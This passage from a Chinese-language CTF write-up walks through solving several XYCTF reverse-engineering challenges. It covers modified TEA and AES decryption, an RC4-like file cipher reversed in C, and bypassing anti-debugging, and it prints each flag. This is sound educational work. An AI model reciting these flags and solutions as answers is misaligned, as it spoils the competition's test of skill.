(flag[<span class="number">5</span>] - <span class="number">246</span>)) +</span><br><span class="line">    (flag[<span class="number">6</span>] * (flag[<span class="number">6</span>] - <span class="number">226</span>)) +</span><br><span class="line">    (flag[<span class="number">7</span>] * (flag[<span class="number">7</span>] - <span class="number">110</span>)) +</span><br><span class="line">    (flag[<span class="number">8</span>] * (flag[<span class="number">8</span>] - <span class="number">174</span>)) +</span><br><span class="line">    (flag[<span class="number">9</span>] * (flag[<span class="number">9</span>] - <span class="number">178</span>)) +</span><br><span class="line">    (flag[<span class="number">10</span>] * (flag[<span class="number">10</span>] - <span class="number">142</span>)) +</span><br><span class="line">    (flag[<span class="number">11</span>] * (flag[<span class="number">11</span>] - <span class="number">230</span>)) +</span><br><span class="line">    (flag[<span class="number">12</span>] * (flag[<span class="number">12</span>] - <span class="number">198</span>)) +</span><br><span class="line">    (flag[<span class="number">13</span>] * (flag[<span class="number">13</span>] - <span class="number">170</span>)) +</span><br><span class="line">    (flag[<span class="number">14</span>] * (flag[<span class="number">14</span>] - <span class="number">234</span>)) +</span><br><span class="line">    (flag[<span class="number">15</span>] * (flag[<span class="number">15</span>] - <span class="number">224</span>)) +</span><br><span class="line">    (flag[<span class="number">16</span>] * (flag[<span class="number">16</span>] - <span class="number">232</span>)) +</span><br><span class="line">    (flag[<span class="number">17</span>] * (flag[<span class="number">17</span>] - <span class="number">168</span>)) +</span><br><span class="line">    (flag[<span class="number">18</span>] * (flag[<span class="number">18</span>] - <span class="number">178</span>)) +</span><br><span class="line">    (flag[<span class="number">19</span>] * (flag[<span class="number">19</span>] - <span class="number">176</span>)) +</span><br><span class="line">    (flag[<span class="number">20</span>] * (flag[<span class="number">20</span>] - <span class="number">212</span>)) +</span><br><span class="line">    (flag[<span class="number">21</span>] * (flag[<span class="number">21</span>] - <span class="number">220</span>)) +</span><br><span class="line">    (flag[<span class="number">22</span>] * (flag[<span class="number">22</span>] - <span class="number">212</span>)) +</span><br><span class="line">    (flag[<span class="number">23</span>] * (flag[<span class="number">23</span>] - <span class="number">150</span>)) +</span><br><span class="line">    (flag[<span class="number">24</span>] * (flag[<span class="number">24</span>] - <span class="number">222</span>)) +</span><br><span class="line">    (flag[<span class="number">25</span>] * (flag[<span class="number">25</span>] - <span class="number">242</span>)) +</span><br><span class="line">    (flag[<span class="number">26</span>] * (flag[<span class="number">26</span>] - <span class="number">170</span>)) +</span><br><span class="line">    (flag[<span class="number">27</span>] * (flag[<span class="number">27</span>] - <span class="number">168</span>)) +</span><br><span class="line">    (flag[<span class="number">28</span>] * (flag[<span class="number">28</span>] - <span class="number">150</span>)) +</span><br><span class="line">    (flag[<span class="number">29</span>] * (flag[<span class="number">29</span>] - <span class="number">232</span>)) +</span><br><span class="line">    (flag[<span class="number">30</span>] * (flag[<span class="number">30</span>] - <span class="number">142</span>)) +</span><br><span class="line">    (flag[<span class="number">31</span>] * (flag[<span class="number">31</span>] - <span class="number">250</span>)) + <span class="number">297412</span> == <span class="number">0</span></span><br><span class="line">):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过观察可以发现，每一行后面减的数除以二就是flag</p><p>那就直接除以二</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;q7WYGscUuptTYXjnjKoyUTKtG&#125;</span></span><br></pre></td></tr></table></figure><h4 id="给阿姨倒一杯卡布奇诺">给阿姨倒一杯卡布奇诺</h4><p>是一个简单的tea，魔改的部分是一开始的data1和data2的异或</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">encrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> i;</span><br><span class="line"><span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">data1 ^= *v;</span><br><span class="line">data2 ^= v[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">sum += <span class="number">1853174124</span>;</span><br><span class="line">data1 += ((data2 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]) ^ (data2 + sum) ^ (*k + <span class="number">16</span> * data2) ^ (sum + i);</span><br><span class="line">data2 += ((data1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]) ^ (data1 + sum) ^ (k[<span class="number">2</span>] + <span class="number">16</span> * data1) ^ (sum + i);</span><br><span class="line">&#125;</span><br><span class="line">*v = data1;</span><br><span class="line">v[<span class="number">1</span>] = data2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个还是相当于把传入当key，data1和2更像是加密的值，要解密直接在最后异或上前一个的最后值就出来了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">uint32_t</span> sum = <span class="number">0x6E75316C</span> * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">data1 = *v;</span><br><span class="line">data2 = v[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0x1f</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">data2 -= ((data1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]) ^ (data1 + sum) ^ (k[<span class="number">2</span>] + <span class="number">16</span> * data1) ^ (sum + i);</span><br><span class="line">data1 -= ((data2 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]) ^ (data2 + sum) ^ (*k + <span class="number">16</span> * data2) ^ (sum + i);</span><br><span class="line">sum -= <span class="number">0x6E75316C</span>;</span><br><span class="line">&#125;</span><br><span class="line">*v = *(v - <span class="number">2</span>) ^ data1;</span><br><span class="line">v[<span class="number">1</span>] = *(v - <span class="number">1</span>) ^ data2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要注意i要是反着的，因为加密的时候用了i</p><p>出来是</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">62333331</span></span><br><span class="line"><span class="number">34656666</span></span><br><span class="line"><span class="number">32643130</span></span><br><span class="line"><span class="number">30613332</span></span><br><span class="line"><span class="number">35383332</span></span><br><span class="line"><span class="number">63303964</span></span><br><span class="line"><span class="number">63316635</span></span><br><span class="line"><span class="number">37373361</span></span><br></pre></td></tr></table></figure><p>转成字符再用xyctf包起来(题目说的是flag{}但是试了不行)：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XYCTF</span>&#123;<span class="number">133</span>bffe401d223a02385d90c5f1ca377&#125;</span><br></pre></td></tr></table></figure><h4 id="easy-language">easy language</h4><p>这个题好坑啊！！QAQ</p><p>先通过e-decompliner插件找到主要目的地</p><p>可以看到是aes</p><p>最后的判断是</p><p><img src="https://s2.loli.net/2024/04/18/LKfxNsRWCpMVqkP.png" alt="image-20240418095501581"></p><p>根据signseacher扫描结果，发现有反调试，通过附加调试跳过</p><p>在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v5 = 字节集比较((_BYTE *)byte_59D0F4 + <span class="number">8</span>, encoded, v3);</span><br></pre></td></tr></table></figure><p>得到byte_59D0F4中的值即正确的密文，</p><p>在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mode = <span class="string">&quot;AES-ECB&quot;</span>;</span><br><span class="line"> v9 = sub_401975((<span class="type">int</span> *)&amp;checknum, (_DWORD **)&amp;key, (<span class="type">char</span> **)&amp;mode, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, &amp;v11, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>中得到key</p><p>丢进在线工具解密aes</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RZy/zVEWMFxaCbzChAg<span class="number">8</span><span class="keyword">x</span><span class="number">26</span>XZYr<span class="number">51</span>rNVnM+zBoBp<span class="number">3</span>gya<span class="number">93</span>L<span class="number">9</span>QQXpFRin<span class="number">1</span>JE<span class="number">33</span>vyx</span><br><span class="line">welcometoxyctf!!</span><br><span class="line">XYCTF&#123;y<span class="number">0</span>u_<span class="title">@r3_v3ry_g00d_a7_E_l</span><span class="title">@ngu</span><span class="title">@ge</span>&#125;</span><br></pre></td></tr></table></figure><p>总结一下：如果遇到奇怪的字符串，像是部分不对的，以及有fake_flag可能有反调试</p><h4 id="馒头">馒头</h4><p>数据结构，直接按ans1把树画出来，直接画就好，</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;xaf1svut7rojh3de0&#125;</span></span><br></pre></td></tr></table></figure><h3 id="week4">week4</h3><h4 id="find-me">find_me</h4><p>一共有三个文件，只有4号是可执行文件，打开分析，发现是把3号加密成1号，那么尝试还原3号，注意其中使用了rand，所以应该写c代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">FILE* inputFile, * outputFile;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> sbox[<span class="number">512</span>] = &#123; <span class="number">0xF3</span>, <span class="number">0x75</span>, <span class="number">0xC9</span>, <span class="number">0xB4</span>, <span class="number">0x2A</span>, <span class="number">0x3A</span>, <span class="number">0x9A</span>, <span class="number">0x90</span>, <span class="number">0xBE</span>, <span class="number">0x43</span>, <span class="number">0x65</span>, <span class="number">0x33</span>, <span class="number">0x39</span>, <span class="number">0xD3</span>, <span class="number">0xF0</span>, <span class="number">0x46</span>, <span class="number">0xA5</span>, <span class="number">0x32</span>, <span class="number">0xCE</span>, <span class="number">0x4B</span>, <span class="number">0x8A</span>, <span class="number">0x6C</span>, <span class="number">0x60</span>, <span class="number">0xC7</span>, <span class="number">0x70</span>, <span class="number">0x55</span>, <span class="number">0xEF</span>, <span class="number">0x96</span>, <span class="number">0xB2</span>, <span class="number">0x08</span>, <span class="number">0xC7</span>, <span class="number">0x68</span>, <span class="number">0x53</span>, <span class="number">0x6E</span>, <span class="number">0xD9</span>, <span class="number">0x0D</span>, <span class="number">0xD4</span>, <span class="number">0x69</span>, <span class="number">0xCD</span>, <span class="number">0x87</span>, <span class="number">0x45</span>, <span class="number">0x01</span>, <span class="number">0xE9</span>, <span class="number">0x93</span>, <span class="number">0x7B</span>, <span class="number">0x21</span>, <span class="number">0x65</span>, <span class="number">0xDE</span>, <span class="number">0x8E</span>, <span class="number">0x24</span>, <span class="number">0x26</span>, <span class="number">0xA6</span>, <span class="number">0xC8</span>, <span class="number">0x94</span>, <span class="number">0x7E</span>, <span class="number">0xFD</span>, <span class="number">0x4F</span>, <span class="number">0xFD</span>, <span class="number">0xAD</span>, <span class="number">0x2B</span>, <span class="number">0x51</span>, <span class="number">0x28</span>, <span class="number">0x0A</span>, <span class="number">0x5C</span>, <span class="number">0xA1</span>, <span class="number">0x0E</span>, <span class="number">0x11</span>, <span class="number">0x45</span>, <span class="number">0x25</span>, <span class="number">0x6D</span>, <span class="number">0x6B</span>, <span class="number">0x9F</span>, <span class="number">0x75</span>, <span class="number">0x5D</span>, <span class="number">0x3E</span>, <span class="number">0x20</span>, <span class="number">0xFA</span>, <span class="number">0xDC</span>, <span class="number">0x07</span>, <span class="number">0xA3</span>, <span class="number">0x77</span>, <span class="number">0xC6</span>, <span class="number">0x8C</span>, <span class="number">0xEC</span>, <span class="number">0x8B</span>, <span class="number">0x3C</span>, <span class="number">0xCE</span>, <span class="number">0x2D</span>, <span class="number">0x18</span>, <span class="number">0xE3</span>, <span class="number">0xBA</span>, <span class="number">0xBD</span>, <span class="number">0xBC</span>, <span class="number">0xCA</span>, <span class="number">0xB7</span>, <span class="number">0xB4</span>, <span class="number">0x03</span>, <span class="number">0x5B</span>, <span class="number">0xF0</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>, <span class="number">0xF2</span>, <span class="number">0x3B</span>, <span class="number">0x34</span>, <span class="number">0x42</span>, <span class="number">0xB3</span>, <span class="number">0x39</span>, <span class="number">0x91</span>, <span class="number">0x67</span>, <span class="number">0x23</span>, <span class="number">0x16</span>, <span class="number">0xEA</span>, <span class="number">0x88</span>, <span class="number">0x05</span>, <span class="number">0x08</span>, <span class="number">0x19</span>, <span class="number">0xDA</span>, <span class="number">0xDF</span>, <span class="number">0xD0</span>, <span class="number">0xF5</span>, <span class="number">0x09</span>, <span class="number">0x23</span>, <span class="number">0x59</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x13</span>, <span class="number">0x85</span>, <span class="number">0xBD</span>, <span class="number">0x3D</span>, <span class="number">0x7E</span>, <span class="number">0x92</span>, <span class="number">0xE4</span>, <span class="number">0x82</span>, <span class="number">0x06</span>, <span class="number">0xBB</span>, <span class="number">0x7B</span>, <span class="number">0x6A</span>, <span class="number">0x47</span>, <span class="number">0xD9</span>, <span class="number">0xF6</span>, <span class="number">0x1E</span>, <span class="number">0x09</span>, <span class="number">0x58</span>, <span class="number">0x1A</span>, <span class="number">0xD8</span>, <span class="number">0xFE</span>, <span class="number">0x29</span>, <span class="number">0x8C</span>, <span class="number">0xBF</span>, <span class="number">0x54</span>, <span class="number">0xAF</span>, <span class="number">0xAE</span>, <span class="number">0xA2</span>, <span class="number">0x8F</span>, <span class="number">0xD6</span>, <span class="number">0xE7</span>, <span class="number">0xBB</span>, <span class="number">0x24</span>, <span class="number">0x97</span>, <span class="number">0x7A</span>, <span class="number">0xD7</span>, <span class="number">0x7F</span>, <span class="number">0xCB</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x49</span>, <span class="number">0x00</span>, <span class="number">0xDC</span>, <span class="number">0xE0</span>, <span class="number">0x5E</span>, <span class="number">0xC9</span>, <span class="number">0xE0</span>, <span class="number">0x95</span>, <span class="number">0x4E</span>, <span class="number">0xC4</span>, <span class="number">0x90</span>, <span class="number">0xEB</span>, <span class="number">0x74</span>, <span class="number">0x6B</span>, <span class="number">0xA0</span>, <span class="number">0x9D</span>, <span class="number">0xCD</span>, <span class="number">0xDE</span>, <span class="number">0xA2</span>, <span class="number">0x87</span>, <span class="number">0x1A</span>, <span class="number">0xD1</span>, <span class="number">0x12</span>, <span class="number">0xC8</span>, <span class="number">0x1B</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0x4A</span>, <span class="number">0x10</span>, <span class="number">0x60</span>, <span class="number">0x79</span>, <span class="number">0x37</span>, <span class="number">0x29</span>, <span class="number">0x25</span>, <span class="number">0xBA</span>, <span class="number">0xAE</span>, <span class="number">0x04</span>, <span class="number">0x1B</span>, <span class="number">0xDB</span>, <span class="number">0xD5</span>, <span class="number">0x48</span>, <span class="number">0xFE</span>, <span class="number">0x51</span>, <span class="number">0x05</span>, <span class="number">0x83</span>, <span class="number">0x15</span>, <span class="number">0x64</span>, <span class="number">0xC4</span>, <span class="number">0x76</span>, <span class="number">0x34</span>, <span class="number">0xB5</span>, <span class="number">0xF2</span>, <span class="number">0xC5</span>, <span class="number">0x78</span>, <span class="number">0x6F</span>, <span class="number">0xC6</span>, <span class="number">0x10</span>, <span class="number">0x5F</span>, <span class="number">0x53</span>, <span class="number">0x81</span>, <span class="number">0xFB</span>, <span class="number">0x8D</span>, <span class="number">0x40</span>, <span class="number">0xE6</span>, <span class="number">0x71</span>, <span class="number">0xA8</span>, <span class="number">0x57</span>, <span class="number">0xB7</span>, <span class="number">0x99</span>, <span class="number">0x20</span>, <span class="number">0x98</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xD8</span>, <span class="number">0x70</span>, <span class="number">0xB9</span>, <span class="number">0xF8</span>, <span class="number">0xE4</span>, <span class="number">0xB5</span>, <span class="number">0x7A</span>, <span class="number">0xAA</span>, <span class="number">0xFA</span>, <span class="number">0x3C</span>, <span class="number">0x73</span>, <span class="number">0x77</span>, <span class="number">0xE8</span>, <span class="number">0xF9</span>, <span class="number">0x12</span>, <span class="number">0x83</span>, <span class="number">0x2A</span>, <span class="number">0xB1</span>, <span class="number">0xC1</span>, <span class="number">0x9F</span>, <span class="number">0xF5</span>, <span class="number">0x5E</span>, <span class="number">0xF1</span>, <span class="number">0xF6</span>, <span class="number">0xD7</span>, <span class="number">0x89</span>, <span class="number">0x30</span>, <span class="number">0x63</span>, <span class="number">0xF4</span>, <span class="number">0x68</span>, <span class="number">0xA9</span>, <span class="number">0x0B</span>, <span class="number">0x36</span>, <span class="number">0x85</span>, <span class="number">0xF8</span>, <span class="number">0xB3</span>, <span class="number">0x95</span>, <span class="number">0x64</span>, <span class="number">0x79</span>, <span class="number">0x56</span>, <span class="number">0x97</span>, <span class="number">0x19</span>, <span class="number">0x5F</span>, <span class="number">0xA8</span>, <span class="number">0x6C</span>, <span class="number">0x4C</span>, <span class="number">0x52</span>, <span class="number">0x69</span>, <span class="number">0xB6</span>, <span class="number">0x5A</span>, <span class="number">0x54</span>, <span class="number">0x63</span>, <span class="number">0x58</span>, <span class="number">0x16</span>, <span class="number">0x86</span>, <span class="number">0x46</span>, <span class="number">0xBE</span>, <span class="number">0x31</span>, <span class="number">0x1D</span>, <span class="number">0xCF</span>, <span class="number">0x42</span>, <span class="number">0x31</span>, <span class="number">0x59</span>, <span class="number">0xEE</span>, <span class="number">0xEA</span>, <span class="number">0x0F</span>, <span class="number">0x28</span>, <span class="number">0x57</span>, <span class="number">0x3B</span>, <span class="number">0x7F</span>, <span class="number">0xD0</span>, <span class="number">0xB9</span>, <span class="number">0x8D</span>, <span class="number">0xED</span>, <span class="number">0x44</span>, <span class="number">0x30</span>, <span class="number">0xA7</span>, <span class="number">0xC1</span>, <span class="number">0x5B</span>, <span class="number">0x04</span>, <span class="number">0x33</span>, <span class="number">0xAC</span>, <span class="number">0x02</span>, <span class="number">0x73</span>, <span class="number">0xDB</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x3D</span>, <span class="number">0xB1</span>, <span class="number">0x36</span>, <span class="number">0x9C</span>, <span class="number">0xA0</span>, <span class="number">0x4D</span>, <span class="number">0x9C</span>, <span class="number">0x3E</span>, <span class="number">0x72</span>, <span class="number">0xF1</span>, <span class="number">0x1F</span>, <span class="number">0x88</span>, <span class="number">0xE5</span>, <span class="number">0xAD</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x0E</span>, <span class="number">0x3A</span>, <span class="number">0xE6</span>, <span class="number">0xD2</span>, <span class="number">0xE1</span>, <span class="number">0xE9</span>, <span class="number">0x44</span>, <span class="number">0x27</span>, <span class="number">0x52</span>, <span class="number">0x99</span>, <span class="number">0xEC</span>, <span class="number">0xBC</span>, <span class="number">0x47</span>, <span class="number">0xCC</span>, <span class="number">0xA6</span>, <span class="number">0x9E</span>, <span class="number">0xD2</span>, <span class="number">0x7C</span>, <span class="number">0xFB</span>, <span class="number">0x72</span>, <span class="number">0xDA</span>, <span class="number">0xA7</span>, <span class="number">0x9A</span>, <span class="number">0x86</span>, <span class="number">0x55</span>, <span class="number">0x8A</span>, <span class="number">0x76</span>, <span class="number">0x9B</span>, <span class="number">0xF3</span>, <span class="number">0x7C</span>, <span class="number">0x8F</span>, <span class="number">0x14</span>, <span class="number">0x7D</span>, <span class="number">0xC5</span>, <span class="number">0x94</span>, <span class="number">0x17</span>, <span class="number">0x8B</span>, <span class="number">0xAB</span>, <span class="number">0x15</span>, <span class="number">0xBF</span>, <span class="number">0x2E</span>, <span class="number">0xDD</span>, <span class="number">0x2C</span>, <span class="number">0xB0</span>, <span class="number">0x62</span>, <span class="number">0x89</span>, <span class="number">0x71</span>, <span class="number">0x92</span>, <span class="number">0x21</span>, <span class="number">0x9D</span>, <span class="number">0x0C</span>, <span class="number">0xEF</span>, <span class="number">0x9E</span>, <span class="number">0xD1</span>, <span class="number">0x2B</span>, <span class="number">0x06</span>, <span class="number">0xF7</span>, <span class="number">0x4F</span>, <span class="number">0xC3</span>, <span class="number">0xCF</span>, <span class="number">0xFF</span>, <span class="number">0x6E</span>, <span class="number">0xE5</span>, <span class="number">0xEB</span>, <span class="number">0x96</span>, <span class="number">0xF9</span>, <span class="number">0xDF</span>, <span class="number">0xCA</span>, <span class="number">0x07</span>, <span class="number">0xD4</span>, <span class="number">0xA3</span>, <span class="number">0x84</span>, <span class="number">0xE3</span>, <span class="number">0x1F</span>, <span class="number">0x66</span>, <span class="number">0x1D</span>, <span class="number">0x18</span>, <span class="number">0x35</span>, <span class="number">0x41</span>, <span class="number">0x2F</span>, <span class="number">0x02</span>, <span class="number">0x66</span>, <span class="number">0x2E</span>, <span class="number">0x6F</span>, <span class="number">0x61</span>, <span class="number">0xD5</span>, <span class="number">0x3F</span>, <span class="number">0x7D</span>, <span class="number">0x78</span>, <span class="number">0x1C</span>, <span class="number">0x32</span>, <span class="number">0xAB</span>, <span class="number">0xA4</span>, <span class="number">0x67</span>, <span class="number">0xC2</span>, <span class="number">0xC0</span>, <span class="number">0x1C</span>, <span class="number">0x11</span>, <span class="number">0xE2</span>, <span class="number">0x2C</span>, <span class="number">0x38</span>, <span class="number">0x8E</span>, <span class="number">0xB2</span>, <span class="number">0x48</span>, <span class="number">0xE1</span>, <span class="number">0x0A</span>, <span class="number">0x22</span>, <span class="number">0xD3</span>, <span class="number">0x41</span>, <span class="number">0xD6</span>, <span class="number">0x91</span>, <span class="number">0x0D</span>, <span class="number">0x03</span>, <span class="number">0xFC</span>, <span class="number">0xFC</span>, <span class="number">0x38</span>, <span class="number">0xAC</span>, <span class="number">0xA9</span>, <span class="number">0x98</span>, <span class="number">0xAA</span>, <span class="number">0x14</span>, <span class="number">0xCB</span>, <span class="number">0xCC</span>, <span class="number">0x4B</span>, <span class="number">0x81</span>, <span class="number">0x2D</span>, <span class="number">0x5C</span>, <span class="number">0xB8</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0xAF</span>, <span class="number">0x93</span>, <span class="number">0xB6</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0xE7</span>, <span class="number">0x35</span>, <span class="number">0x4A</span>, <span class="number">0xC2</span>, <span class="number">0xA5</span>, <span class="number">0x37</span>, <span class="number">0x43</span>, <span class="number">0x9B</span>, <span class="number">0x22</span>, <span class="number">0x80</span>, <span class="number">0xC3</span>, <span class="number">0xDD</span>, <span class="number">0xED</span>, <span class="number">0x5A</span>, <span class="number">0x5D</span>, <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0x6A</span>, <span class="number">0x27</span>, <span class="number">0x2F</span>, <span class="number">0x74</span>, <span class="number">0xEE</span>, <span class="number">0xF7</span>, <span class="number">0x26</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0xB8</span>, <span class="number">0xE8</span>, <span class="number">0x61</span>, <span class="number">0xA4</span>, <span class="number">0xB0</span>, <span class="number">0xC0</span>, <span class="number">0x13</span>, <span class="number">0x4E</span>, <span class="number">0xA1</span>, <span class="number">0x17</span> &#125;; </span><br><span class="line"><span class="type">int</span> v8 = <span class="number">0</span>, v10 = <span class="number">0</span>, v11 = <span class="number">0</span>, v9, i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> v12, v13;</span><br><span class="line"></span><br><span class="line">inputFile = fopen(<span class="string">&quot;Doraemon1&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">outputFile = fopen(<span class="string">&quot;Doraemon3&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (inputFile == <span class="literal">NULL</span> || outputFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;无法打开文件\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!feof(inputFile)) &#123;</span><br><span class="line">v10 = (v10 + <span class="number">1</span>) % <span class="number">512</span>;</span><br><span class="line">v11 = (sbox[v10] + v11) % <span class="number">512</span>;</span><br><span class="line">v13 = sbox[v10];</span><br><span class="line">sbox[v10] = sbox[v11];</span><br><span class="line">sbox[v11] = v13;</span><br><span class="line">v12 = sbox[(<span class="type">unsigned</span> <span class="type">char</span>)((sbox[v11] + sbox[v10]) % <span class="number">512</span>)];</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> c = fgetc(inputFile) ^ v12;</span><br><span class="line">fputc(c, outputFile);</span><br><span class="line"></span><br><span class="line">srand(sbox[v8 % <span class="number">512</span>]);</span><br><span class="line">v9 = rand() % <span class="number">4</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; v9; ++i) &#123;</span><br><span class="line">fgetc(inputFile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">++v8;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose(inputFile);</span><br><span class="line">fclose(outputFile);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就还原了3，打开3看一下，好像是通过3生成了一个here，那就执行一下，打开here一看，flag出来了</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;i_L0ve_Dor4emon_Fov3rver&#125;</span></span><br></pre></td></tr></table></figure><h4 id="舔狗四部曲–简爱">舔狗四部曲–简爱</h4><p>先看主函数，好像是两个tea接着一个vm，从后往前试一下，先解vm</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 